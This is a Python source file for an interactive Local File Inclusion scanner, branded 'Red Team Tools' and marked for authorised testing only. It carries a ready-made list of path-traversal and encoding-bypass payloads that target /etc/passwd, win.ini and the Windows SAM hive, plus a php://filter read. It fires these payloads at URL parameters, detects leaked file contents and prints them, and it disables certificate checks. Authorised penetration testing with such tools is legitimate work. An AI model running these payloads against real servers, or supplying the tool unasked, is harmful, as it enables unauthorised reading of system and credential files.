#!/usr/bin/env python3
"""
Red Team Tools - LFI Scanner
Local File Inclusion vulnerability scanner
For authorized security testing only
"""

import sys
import os
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *

try:
    import requests
    AVAILABLE = True
except ImportError:
    AVAILABLE = False


class LFIScanner:
    """Local File Inclusion scanner"""
    
    # LFI payloads for different OS
    PAYLOADS = {
        "linux": [
            "../etc/passwd",
            "....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..\\..\\..\\etc/passwd",
            "....\\\\....\\\\etc/passwd",
            "../../../../../../../etc/passwd%00",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ],
        "windows": [
            "..\\..\\..\\windows\\win.ini",
            "....\\\\....\\\\windows\\win.ini",
            "..%5c..%5c..%5cwindows/win.ini",
            "C:\\Windows\\win.ini",
            "C:/Windows/win.ini",
            "file:///C:/Windows/win.ini",
            "../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ],
        "common": [
            "....//....//....//....//....//etc/passwd",
            "..././..././..././etc/passwd",
            "..;/..;/..;/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd",
        ]
    }
    
    # Signatures to detect success
    SIGNATURES = {
        "linux": ["root:x:", "root:*:", "daemon:", "bin:", "sys:"],
        "windows": ["[fonts]", "[extensions]", "for 16-bit app support"],
    }
    
    def __init__(self, base_url: str, timeout: float = 10.0):
        self.base_url = base_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.session.verify = False
        self.vulnerabilities: List[Dict] = []
    
    def _check_response(self, response_text: str) -> Tuple[bool, str]:
        """Check if response indicates successful LFI"""
        for os_type, sigs in self.SIGNATURES.items():
            for sig in sigs:
                if sig in response_text:
                    return True, os_type
        return False, ""
    
    def scan_parameter(self, url: str, param: str, method: str = "GET") -> List[Dict]:
        """Scan a single parameter for LFI"""
        results = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # Get baseline
        try:
            baseline = self.session.get(url, timeout=self.timeout)
            baseline_length = len(baseline.text)
        except:
            baseline_length = 0
        
        all_payloads = self.PAYLOADS["linux"] + self.PAYLOADS["windows"] + self.PAYLOADS["common"]
        
        for i, payload in enumerate(all_payloads):
            progress_bar(i + 1, len(all_payloads), f"  Testing {param}")
            
            # Build test URL
            test_params = query_params.copy()
            test_params[param] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            try:
                if method.upper() == "GET":
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    response = self.session.post(url, data={param: payload}, timeout=self.timeout)
                
                # Check for success
                is_vuln, os_type = self._check_response(response.text)
                
                if is_vuln:
                    result = {
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "method": method,
                        "os_type": os_type,
                        "evidence": response.text[:200]
                    }
                    results.append(result)
                    self.vulnerabilities.append(result)
                    print()
                    success(f"LFI FOUND! Param: {param}, OS: {os_type}")
                    return results  # Stop on first success
                
            except Exception:
                pass
        
        print()
        return results
    
    def scan_url(self, url: str) -> List[Dict]:
        """Scan all parameters in URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            warning("No parameters found in URL")
            return []
        
        info(f"Testing {len(params)} parameter(s)...")
        results = []
        
        for param in params.keys():
            param_results = self.scan_parameter(url, param)
            results.extend(param_results)
        
        return results
    
    def print_results(self):
        """Print scan results"""
        if not self.vulnerabilities:
            warning("No LFI vulnerabilities found")
            return
        
        print(f"\n{R}{BRIGHT}═══ LFI Vulnerabilities Found ═══{RESET}")
        
        for vuln in self.vulnerabilities:
            print(f"\n{R}[VULNERABLE]{RESET}")
            print(f"  URL:     {vuln['url']}")
            print(f"  Param:   {vuln['param']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  OS:      {vuln['os_type']}")


def interactive_mode():
    """Interactive LFI scanning"""
    clear_screen()
    print_banner("LFI SCANNER", font="small", color="red")
    
    print(f"{R}⚠  AUTHORIZED TESTING ONLY{RESET}\n")
    
    if not AVAILABLE:
        error("requests not installed! Run: pip install requests")
        input(f"\n{C}Press Enter...{RESET}")
        return
    
    while True:
        print(f"\n{C}OPTIONS{RESET}")
        print(f"  {Y}[1]{RESET} Scan URL Parameters")
        print(f"  {Y}[2]{RESET} Test Single Parameter")
        print(f"  {Y}[3]{RESET} Custom Payload Test")
        print(f"  {R}[0]{RESET} Back")
        
        choice = prompt("Select").strip()
        
        if choice == "0":
            break
        
        elif choice == "1":
            url = prompt("URL with parameters").strip()
            if not url:
                continue
            
            if '?' not in url:
                error("URL must contain parameters (e.g., ?file=test)")
                continue
            
            scanner = LFIScanner(url)
            scanner.scan_url(url)
            scanner.print_results()
        
        elif choice == "2":
            url = prompt("Base URL").strip()
            param = prompt("Parameter name").strip()
            
            if not url or not param:
                continue
            
            # Add parameter if not present
            if '?' not in url:
                url = f"{url}?{param}=test"
            elif param not in url:
                url = f"{url}&{param}=test"
            
            scanner = LFIScanner(url)
            scanner.scan_parameter(url, param)
            scanner.print_results()
        
        elif choice == "3":
            url = prompt("URL with parameter").strip()
            param = prompt("Parameter name").strip()
            payload = prompt("Custom payload").strip()
            
            if not all([url, param, payload]):
                continue
            
            try:
                scanner = LFIScanner(url)
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                query_params[param] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                response = scanner.session.get(test_url, timeout=10)
                
                print(f"\n{Y}Response ({len(response.text)} bytes):{RESET}")
                print(response.text[:500])
                
                is_vuln, os_type = scanner._check_response(response.text)
                if is_vuln:
                    success(f"Potential LFI! Detected {os_type} signatures")
                
            except Exception as e:
                error(f"Request failed: {e}")
    
    input(f"\n{C}Press Enter...{RESET}")


if __name__ == "__main__":
    interactive_mode()
